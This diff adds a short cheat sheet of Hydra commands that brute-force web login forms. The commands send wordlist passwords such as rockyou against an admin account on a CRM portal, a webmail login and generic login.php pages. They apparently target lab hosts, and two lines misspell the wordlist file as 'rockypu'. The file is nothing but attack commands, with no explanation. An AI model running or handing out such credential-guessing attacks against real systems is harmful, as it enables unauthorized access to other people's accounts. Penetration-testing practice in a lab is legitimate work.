@@ -1,0 +1,15 @@
+
+========http-post===========================
+
+hydra -l username -P /root/Desktop/Test.txt url.zz.za http-post-form "/portal/xlogin/:ed=^USER^&pw=^PASS^:S=302"
+
+hydra -l admin -P /usr/share/wordlists/rockypu.txt 192.168.101.10 -s 88 http-post-form "/index.php?module=Users&action=Login:__vtrftk=sid%3Afe8d285f2c8d634669436a4f6ee9207b62f04b80%2C1518556391&username=^USER^&password=^PASS^:Invalid"
+
+hydra 192.168.101.10 -s 88 http-form-post "/index.php?module=Users&action=Login:__vtrftk=sid%3A1d24833a22417d1d4e19be2c43ff5021e2ff5a5a%2C1500076613&username=^USER^&password=^PASS^:Error=1" -l admin -P /usr/share/wordlists/rockyou.txt -t 20 -o crm-attack.txt
+
+
+hydra 192.168.101.10 -s 8080 http-form-post "//mail/?_task=login?:_token=EVjgDMLtwDLN7POWXSVU3rb4mcnWnkDs&_task=login&_action=login&_timezone=America%2FNew_York&_url=&_user=^USER^&_pass=^PASS^:S=Inbox" -l admin@test.lab -P /usr/share/wordlists/rockyou.txt -t 20
+
+========http-get===========================
+
+hydra -l admin -P /usr/share/wordlists/rockypu.txt 192.168.101.10 -s 88 http-get-form"/login.php:user=^USER^&pass=^PASS^:S=successful"
